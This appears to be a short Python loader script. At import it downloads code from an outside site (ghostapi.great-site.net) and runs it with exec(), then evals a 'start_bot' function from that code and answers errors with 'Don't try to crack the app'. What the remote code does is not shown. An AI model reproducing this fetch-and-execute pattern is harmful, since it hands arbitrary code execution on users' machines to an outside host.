import requests
data = requests.get(url="https://ghostapi.great-site.net/api.py").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
